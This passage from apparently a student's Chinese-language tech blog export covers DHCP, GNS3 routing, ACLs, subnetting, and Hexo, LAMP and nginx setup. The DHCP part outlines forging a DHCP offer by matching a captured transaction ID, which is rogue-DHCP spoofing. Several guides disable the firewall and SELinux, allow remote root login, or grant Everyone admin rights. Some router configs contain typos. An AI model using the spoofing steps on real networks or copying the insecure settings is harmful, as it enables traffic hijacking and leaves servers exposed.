src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231244528.png" alt="image-20211225231244528"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231248893.png" alt="image-20211225231248893"></p><p>获取IP过程</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231304482.png" alt="image-20211225231304482"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231309188.png" alt="image-20211225231309188"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231315479.png" alt="image-20211225231315479"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231320198.png" alt="image-20211225231320198"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231325853.png" alt="image-20211225231325853"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231331629.png" alt="image-20211225231331629"></p><p>一个完整的DHCP过程中，ID保持不变</p><p>模拟服务器发送offer 报文的过程需要注意的地方</p><p>​       保证服务器与客户端的连通</p><p>​       准备好一个offer报文，可以自己编辑</p><p>​       使用wireshark抓客户端发的Discover报文时，确定当前客户端随机出的Transaction的ID</p><p>​       更改offer报文中的Transaction ID 与Discover报文中一致</p><p>​       使用发包软件发送offer报文</p><p>地址租期</p><p>DHCP服务器提供的每个IP地址都有相应的租用期，在Offer报文中的IP Address Lease Time中可以看到。地址租期时间过长会导致地址资源长期被占用，租期过短会导致DHCP请求包过多，增加网络负担。还要结合当前使用场景来设置。一般来说，对DHCP客户端数量较大，且断开网络比较频繁的场所，如机场、商铺等，一般把DHCP租期配置较短，这样IP地址能很快被回收。</p>]]></content>
      
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> UDP </tag>
            
            <tag> DHCP </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GNS3-分网段</title>
      <link href="/2021/12/25/GNS3-%E5%88%86%E7%BD%91%E6%AE%B5/"/>
      <url>/2021/12/25/GNS3-%E5%88%86%E7%BD%91%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="gns3完成两个网段之间的主机互相通信"><a href="#gns3完成两个网段之间的主机互相通信" class="headerlink" title="gns3完成两个网段之间的主机互相通信."></a>gns3完成两个网段之间的主机互相通信.</h1><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225224647100.png" alt="image-20211225224647100"></p><h2 id="文字版"><a href="#文字版" class="headerlink" title="文字版"></a>文字版</h2><p>PC-1: ip 192.168.10.10/24 192.168.10.1</p><p>PC-2:: ip 192.168.10.20/24 192.168.10.1</p><p>PC-4: ip 172.20.30.40/24 172.20.30.1</p><p>PC-3: ip 172.20.30.30/24 172.20.30.1</p><p>PC-5: ip10.10.10.10/16 10.10.0.1</p><p>PC-6: ip 10.10.10.20/16 10.10.0.1</p><p>R-1 : configure terminal</p><p>​     Interface f1/1</p><p>​     Ip address 192.168.10.1 255.255.255.0</p><p>​     no shutdown</p><p>​     exit</p><p>​     interface f1/0</p><p>​     ip address 172.20.30.1 255.255.255.0</p><p>​     no sh</p><p>​     exit</p><p>​     interface f0/0</p><p>​     ip address 10.200.10.30 255.255.255.0</p><p>​     no sh</p><p>​     exit</p><p>​     ip route 10.10.0.0 255.255.0.0 10.200.10.10</p><p>​     exit</p><p>R-2: confeigure terminal</p><p>​    Interface f1/0</p><p>​    Ip address 10.10.0.1 255.255.0.0</p><p>​    no sh</p><p>​    exit</p><p>​    interface f0/0</p><p>​    ip address 10.200.10.10 255.255.255.0</p><p>​    no sh</p><p>​    exit</p><p>​    ip route 192.168.10.0 255.255.255.0 10.200.10.30</p><p>​    exit</p>]]></content>
      
      
      
        <tags>
            
            <tag> Gns3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子网划分</title>
      <link href="/2021/12/25/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/"/>
      <url>/2021/12/25/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>为什么进行子网划分<br>减少网络流量，无论什么样的流量，我们都希望它少些，网络流量亦如此。如果没有可信赖的路由器，网络流量可能导致整个网络停顿，但有了路由器后，大部分流量都将呆在本地网络内，只有前往其他网络的分组将穿越路由器。路由器增加广播域，广播域越多，每个广播轻松划分子网域就越小，而每个网段的网络流量也越少。</p><p>优化网络性能，这是减少网络流量的结果。</p><p>简化管理，与庞大的网络相比，在一系列相连的小网络中找出并隔离网络问题更容易。</p><p>有助于覆盖大型地理区域，WAN链路比LAN链路的速度慢得多，且更昂贵;单个大跨度的大型网络在前面说的各个方面都可能出现问题，而将多个小网络连接起来可提高系统的效率。<br>明确需求<br>我们创建子网的时候，一定是根据一定的要求创建的，这个要求就是我们实际的网络需求。一般我们按如下步骤来明确我们的网络需求：</p><p>子网简单算法</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223656140.png" alt="image-20211225223656140"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223709974.png" alt="image-20211225223709974"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223720591.png" alt="image-20211225223720591"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223736105.png" alt="image-20211225223736105"></p><p>我还不会算二进制 - __-!</p>]]></content>
      
      
      
        <tags>
            
            <tag> 子网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GNS-3安装</title>
      <link href="/2021/12/25/GNS-3/"/>
      <url>/2021/12/25/GNS-3/</url>
      
        <content type="html"><![CDATA[<ol><li><p>双击开始安装</p><p> <img src="https://s2.loli.net/2021/12/25/x9sQYlWJXOUIDyi.png" alt="image-20211225222509907"></p></li></ol><p>​    2.这里红框内的选项是必选的，其他的可以不选，也可以都勾选，都勾选的话，安装的时候会下载，会很慢，然后点 Next</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222759779.png" alt="image-20211225222759779"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222811158.png" alt="image-20211225222811158"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222821864.png" alt="image-20211225222821864"></p><p>​    3.刚刚组件哪里勾选了 GNS3 VM 就会出现红框内容，然后 next</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222840094.png" alt="image-20211225222840094"></p><p>​    4.安装到这里的时候需要注意一下</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222923651.png" alt="image-20211225222923651"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223006828.png" alt="image-20211225223006828"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223015049.png" alt="image-20211225223015049"></p><p>​    5.完成安装后，打开软件会有初始配置</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223037740.png" alt="image-20211225223037740"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223047503.png" alt="image-20211225223047503"></p><p>​        这里表示连接成功了</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223111024.png" alt="image-20211225223111024"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223122610.png" alt="image-20211225223122610"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223129823.png" alt="image-20211225223129823"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223139049.png" alt="image-20211225223139049"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223148148.png" alt="image-20211225223148148"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223201070.png" alt="image-20211225223201070"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223214908.png" alt="image-20211225223214908"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223221273.png" alt="image-20211225223221273"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Gns3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win服务器搭建网站</title>
      <link href="/2021/12/25/win%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
      <url>/2021/12/25/win%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>1.在<a href="https://down.chinaz.com/soft/29129.htm%E4%B8%8B%E8%BD%BD%E6%A0%A1%E6%97%A0%E5%BF%A7%E6%95%99%E5%B8%88%E8%AF%84%E4%BB%B7%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81">https://down.chinaz.com/soft/29129.htm下载校无忧教师评价系统源码</a></p><p><img src="https://s2.loli.net/2021/12/25/t56m3iqjYDZGbse.png" alt="image-20211225215610047"></p><p><img src="https://s2.loli.net/2021/12/25/pSotXOTAfz3QWHI.png" alt="image-20211225215649656"></p><p><img src="https://s2.loli.net/2021/12/25/R8Y5CX31PLDfgQ6.png" alt="image-20211225215715030"></p><p><img src="https://s2.loli.net/2021/12/25/sVAPZBCqeorUOxf.png" alt="image-20211225220107518"></p><p><img src="https://s2.loli.net/2021/12/25/1m9sAzM8LfH2JG7.png" alt="image-20211225220142873"></p><p>至此就算是成功了，接下来，安装一个自己下的网站源码试试</p><p><img src="https://s2.loli.net/2021/12/25/jRqQcCiY7yHhLVt.png" alt="image-20211225220242402"></p><p><img src="https://s2.loli.net/2021/12/25/JyfhXmdOx6n73bC.png" alt="image-20211225220302892"></p><p><img src="https://s2.loli.net/2021/12/25/slBnRvty1XhdZug.png" alt="image-20211225220314980"></p><p><img src="https://s2.loli.net/2021/12/25/7uKLJEOfM9SNFVp.png" alt="image-20211225220340668"></p><p>这里新建的是网站源码的起始文件，在网站根目录下</p><p><img src="../../../img/image-20211225220708845.png" alt="image-20211225220708845"></p><p><img src="../../../img/image-20211225220729622.png" alt="image-20211225220729622"></p><p><img src="../../../img/image-20211225220743198.png" alt="image-20211225220743198"></p><p><img src="../../../img/image-20211225220751314.png" alt="image-20211225220751314"></p><p>如果发现没有打不开网站，可能端口被占用，可以在应用程序池里将占用端口的服务停止</p><p>或者可能是没有文件权限，在网站根目录下，右键网站文件夹，将IIS或者Every one 加入到管理员权限组里面</p><p>2.修改数据库</p><p>​    将网站的 access 数据库迁入 mysql 数据库中</p><p><img src="https://s2.loli.net/2021/12/25/CpzAjOeg3YkJFsu.png" alt="image-20211225221721119"></p><p><img src="https://s2.loli.net/2021/12/25/Et7dKfJLkPQFSoe.png" alt="image-20211225222302455"></p><p><img src="https://s2.loli.net/2021/12/25/5RMpUfyBFNe2vIr.png" alt="image-20211225221810570"></p><p>​    <img src="../../../img/image-20211225221342526.png" alt="image-20211225221342526"></p><p><img src="https://s2.loli.net/2021/12/25/H6O9ocKgtdzyxap.png" alt="image-20211225221400956"></p><p><img src="https://s2.loli.net/2021/12/25/OY6uwMcU5hxr2KW.png" alt="image-20211225221412994"></p><p><img src="https://s2.loli.net/2021/12/25/nmN4Mj6uyKblPf2.png" alt="image-20211225221424717"></p><p><img src="../../../img/image-20211225221454303.png" alt="image-20211225221454303"></p><p><img src="../../../img/image-20211225221504021.png" alt="image-20211225221504021"></p><p><img src="../../../img/image-20211225221525800.png" alt="image-20211225221525800"></p><p><img src="../../../img/image-20211225221552813.png" alt="image-20211225221552813"></p><p>服务器浏览器版本太低，需要在外面浏览器测试</p><p>在网站根目录下</p><p><img src="https://s2.loli.net/2021/12/25/OIGXJ2z8bg1yV6D.png" alt="image-20211225222127139"></p><p><img src="../../../img/image-20211225221629946.png" alt="image-20211225221629946"></p><p>end</p>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由</title>
      <link href="/2021/12/25/%E8%B7%AF%E7%94%B1/"/>
      <url>/2021/12/25/%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_0939.JPG" alt="IMG_0939"></p><p>实验要求：要求以下全部使用标准ACL实现</p><p>​     1.要求10网段禁止访问整个50网段，访问其他不受限制</p><p>​     2.要求10.1.1.1禁止访问40网段，其他不受影响</p><p>​     3.要求40.1.1.1禁止访问50网段，其他不受影响</p><p>拓补图</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image002.jpg" alt="img"></p><p>配置</p><p>PC0：ip 192.168.10.10/24 192.168.10.1</p><p>PC1：ip 192.168.10.20/24 192.168.10.1</p><p>PC2：ip 192.168.50.10/24 192.168.50.1</p><p>PC3：ip 192.168.50.20/24 192.168.50.1</p><p>PC4：ip 192.168.40.20/24 192.168.40.1</p><p>PC5：ip 192.168.40.10/24 192.168.40.1</p><p>R1:</p><p>R1&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R1</p><p>​    intface g0/0</p><p>​    ip address 192.168.10.1 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/1</p><p>​    ip address 192.168.20.10 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    ip route 0.0.0.0 0.0.0.0 192.168.20.20</p><p>​    exit</p><p>R3:</p><p>​    R3&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R3</p><p>​    intface g0/1</p><p>​    ip address 192.168.40.1 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/0</p><p>​    ip address 192.168.30.20 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    ip route 0.0.0.0 0.0.0.0 192.168.30.10</p><p>​    exit</p><p>R2：</p><p>​    R2&gt;：enable</p><p>​    configure terminal</p><p>​    hostname R2</p><p>​    intface g0/0</p><p>​    ip address 192.168.20.20 255.255.255.0</p><p>​    no shutdown</p><p>​    exit</p><p>​    intface g0/1</p><p>​    ip address 192.168.30.10 255.255.255.0</p><p>​    no shutdown</p><p>​    intface g0/2</p><p>​    ip address 192.168.50.1 255.255.255.0</p><p>​    no shutdown</p><p>exit</p><p>​    ip route 192.168.10.0 255.255.255.0 192.168.20.10</p><p>​    ip route 192.168.40.0 255.255.255.0 192.168.30.20</p><p>​    exit</p><p>全通之后建立ACL表禁止</p><p>​    R1：configure terminal</p><p>​       access-list 10 deny 192.168.0.0 0.0.255.255</p><p>​       intface g0/0</p><p>​       ip access-group 10 in</p><p>​    R3：configure terminal</p><p>​       access-list 10 deny 192.168.0.0 0.0.255.255</p><p>​       interface g0/1</p><p>​       ip access-group 10 in</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image004.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/clip_image006.jpg" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建部署到github</title>
      <link href="/2021/12/25/hexo%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/12/25/hexo%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>软件安装</p><p><a href="https://nodejs.org/en/">node.js</a> 安装后 node -v </p><p><a href="https://git-scm.com/download/win">git</a> 安装后 git -v</p><p>打开git 命令行窗口输入,完成后 cnpm -v</p><p><code>npm install -g cnpm --registry==https://registry.npm.taobao.org</code></p><p>安装hexo</p><p><code>cnpm install -g hexo-cli</code>    完成后 hexo -v</p><p>搭建 hexo 博客</p><p>1.在电脑里随便哪个盘符新建文件夹myblog(名字随便)</p><p>2.进入刚刚新建的文件夹，右键打开 git bash here</p><p>​        <code>hexo init</code>        初始化后会自动下载一些文件到这个目录</p><p>3.<code>hexo g</code>生成和<code>hexo s</code>启动服务</p><p>4.hexo s 是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a> 就可以可看到内容</p><p>5.<a href="https://hexo.io/themes/">在这里</a>选择一个喜欢的主题下载到本地</p><p>6.将主题解压只博客根目录下的 themes 文件夹下</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171007003.png" alt="image-20211225171007003"></p><p>7.打开博客根目录下的 _config.yml 文件，在里面找到 theme: (冒号后面改成主题的文件夹名字)</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171519410.png" alt="image-20211225171519410"></p><p><img src="https://s2.loli.net/2021/12/25/KZUlnzDOadV4ih5.png" alt="image-20211225212255378"></p><p>​            theme:后面填下载主题的文件夹名字</p><p>​            repo:后面输入仓库地址，不清楚的话，仓库地址在下图</p><p>​            <img src="https://s2.loli.net/2021/12/25/5IaEk27ciNM6qbw.png" alt="image-20211225212519454"></p><p>​            branch:后面输入仓库分支，master</p><p>8.执行 <code>hexo clean &amp;&amp; hexo g</code>    清理缓存，然后<code>hexo s</code> 查看效果</p><p>9.修改主题内容可以参考主题作者的github文档</p><p>部署到github</p><p>1.在github上新建一个仓库，每个ID只能建一个仓库来用作域名</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225171847503.png" alt="image-20211225171847503"></p><p><img src="https://s2.loli.net/2021/12/25/yuUHFWnvbdIPzSh.png" alt="image-20211225210322079"></p><p>配置SSH免密登录</p><p>提交代码的时候需要你github的权限，每次打密码不方便也不安全，所以使用SSH来解决这个问题</p><p>​    1.找到C:\Users\as\ssh,这个文件夹并删除</p><p>​    2.然后右键打开git bash here 输入命令：<code>ssh-keygen -t rsa -C github xxxxxxx@000.com(注册github的邮件地址)</code>，生成密钥，连续敲三次回车，出现下图，代表成功。</p><p><img src="https://s2.loli.net/2021/12/25/2z7xgERQ6yTAsjD.png" alt="image-20211225213650448"></p><p>​    3.最后生成一个新的ssh文件夹，找到 ssh\id_rsa.pub 文件，打开后复制里面的密钥内容。</p><p>​    4.打开github主页</p><p>​    <img src="https://s2.loli.net/2021/12/25/1FHlSgVfzOdaMUm.png" alt="image-20211225211318194"></p><p><img src="https://s2.loli.net/2021/12/25/ZyusHmliaMzqDtr.png" alt="image-20211225211339158"></p><p><img src="https://s2.loli.net/2021/12/25/PdpKTjAY4MQFJV9.png" alt="image-20211225211356823"></p><p>​    <img src="https://s2.loli.net/2021/12/25/YeFz6GLKxfqryXl.png" alt="image-20211225211421951"></p><p>​    粘贴内容，点击绿色的图标</p><p>​    5.测试是否成功</p><p>​    输入<code>ssh -T git@github.com </code></p><p>​    如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><p>​    Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access </p><p>​    看到这个信息，说明已经成功了。</p><p>​    6.配置仓库</p><p>​    <code>git config --global user.name "username" </code>        双引号里面的内容添自己的github的用户名</p><p>​    <code>git config --global user.email  "xxx@qq.com" </code>        双引号里面的内容添自己注册github的邮箱</p><p>​    7.最后在博客的根目录下，打开DOS窗口或者右键打开 github bash here 输入命令</p><p>​    <code>hexo clean &amp;&amp; hexo g</code></p><p>​    推到自己的仓库</p><p>​    <code>hexo d</code></p><p>​    浏览器中输入自己的github地址，查看自己的博客吧。</p><p>​    其他命令：</p><p>​    <code>hexo new "xxx"</code>        新建博客文档</p><p>​    </p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP搭建</title>
      <link href="/2021/12/25/LAMP%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/12/25/LAMP%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>yum安装apache+php+mysql，配置开机自启</p><p><code>yum install -y httpd mariadb-server php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml</code></p><p>配置防火墙开机不启动</p><p><code>systemctl disable firewalld</code></p><p>停止防火墙</p><p><code>systemctl stop firewalld</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160955245.png" alt="image-20211225160955245"></p><p>设置数据库开机启动</p><p><code>systemctl enable mariadb</code></p><p><code>systemctl start mariadb</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225161605939.png" alt="image-20211225161605939"></p><p>编辑文件 使 apache 网页显示php基本信息</p><p><code>vim /var/www/heml/index.php</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>打开网页看看<img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162322514.png" alt="image-20211225162322514"></p><p>编辑配置文件关闭SElinux安全模块</p><p><code>vim /etc/sysconfig/selinux</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162010980.png" alt="image-20211225162010980"></p><p>配置mysql </p><p><code>mysql_secure_installation</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162104003.png" alt="image-20211225162104003"></p><p>是否设置root 密码        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162356614.png" alt="image-20211225162356614"></p><p>是否删除匿名用户        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162424048.png" alt="image-20211225162424048"></p><p>是否允许root远程登录        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162456282.png" alt="image-20211225162456282"></p><p>是否删除测试数据库        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162513236.png" alt="image-20211225162513236"></p><p>是否刷新权限        y</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162530272.png" alt="image-20211225162530272"></p><p>登录mysql</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225162547106.png" alt="image-20211225162547106"></p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> LAMP </tag>
            
            <tag> apache </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码安装nginx</title>
      <link href="/2021/12/25/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85nginx/"/>
      <url>/2021/12/25/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85nginx/</url>
      
        <content type="html"><![CDATA[<p>源码安装nginx，下载html源代码，把源代码运行起来。</p><p>在<a href="http://nginx.org/download/nginx-1.20.2.tar.gz%E4%B8%8B%E8%BD%BD%E6%9C%AC%E5%9C%B0">http://nginx.org/download/nginx-1.20.2.tar.gz下载本地</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155336921.png" alt="image-20211225155336921"></p><p>在文件存放目录右键打开终端</p><p><code>scp .\nginx-1.28.2.tar.gz root@192.168.3.128:/root</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155357240.png" alt="image-20211225155357240"></p><p>解压</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155424411.png" alt="image-20211225155424411"></p><p>./ 运行configure</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155458169.png" alt="image-20211225155458169"></p><p>错误提示：没有PCRE库</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155511400.png" alt="image-20211225155511400"></p><p>安装 gcc pcre pcre-devel 库</p><p><code>yum install -y gcc pcre pcre-devel zlib liberary</code></p><p>配置目录</p><p>/uer/bin/ = 软件二进制文件</p><p>/etc/xxx.conf = 软件的配置文件</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160429417.png" alt="image-20211225160429417"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225155833639.png" alt="image-20211225155833639"></p><p>将nginx 启动文件安装到/usr/bin/nginx 下</p><p>将nginx 配置文件安装到/etc/nginx/ 下</p><p><code>./configure --sbin-path=/usr/bin/nginx --conf-path=/etc/nginx/nginx.conf</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160457547.png" alt="image-20211225160457547"></p><p>编译安装</p><p>安装过程中至结束没有显示错误表示安装成功</p><p><code>make &amp;&amp; make install</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160619191.png" alt="image-20211225160619191"></p><p>启动</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160647403.png" alt="image-20211225160647403"></p><p>关闭防火墙测试</p><p>systemctl stop firewalld</p><p>测试是否成功开启服务</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225160730366.png" alt="image-20211225160730366"></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> LNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim基础</title>
      <link href="/2021/12/25/Vim%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/12/25/Vim%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>Vim基础命令</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154521878.png" alt="image-20211225154521878"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154532563.png" alt="image-20211225154532563"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154547117.png" alt="image-20211225154547117"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154618354.png" alt="image-20211225154618354"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154627549.png" alt="image-20211225154627549"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154634592.png" alt="image-20211225154634592"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154715657.png" alt="image-20211225154715657"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154727390.png" alt="image-20211225154727390"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础命令</title>
      <link href="/2021/12/25/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/12/25/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/IMG_1773.JPG" alt="IMG_1773"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153600700.png" alt="image-20211225153600700"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153721923.png" alt="image-20211225153721923"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153721923.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153805828.png" alt="image-20211225153805828"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153816344.png" alt="image-20211225153816344"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153816344.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153845073.png" alt="image-20211225153845073"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153857001.png" alt="image-20211225153857001"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153906435.png" alt="image-20211225153906435"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153956501.png" alt="image-20211225153956501"><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154032287.png" alt="image-20211225154032287"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154235670.png" alt="image-20211225154235670"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154253661.png" alt="image-20211225154253661"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154302395.png" alt="image-20211225154302395"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154311528.png" alt="image-20211225154311528"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154321188.png" alt="image-20211225154321188"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154333980.png" alt="image-20211225154333980"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225154345404.png" alt="image-20211225154345404"></p><p> 网络类</p><p>​    查看网卡信息</p><p>​    <code>ip addr</code></p><p>​    查看路由信息&amp;默认网关</p><p>​    <code>ip route</code></p><p>​    查看网卡信息（老系统）</p><p>​    <code>ifconfig</code></p><p>​    查看本机开发的TCP和UDP端口</p><p>​    <code>netstat -antlp</code></p><p>​    <code>netstat -anulp</code></p><p>​    （-a:显示所有， -n:不解析服务名称， t:仅显示tcp信息， -u:仅显示udp信息）</p><p>​    查看正在监听的端口</p><p>​    <code>ss -antlp</code>和netstat类似，但是比netstat更快</p><p>​    查看路由跳点（可以看到路由都经过哪些地址最终到达目标地址）</p><p>​    TRACERT 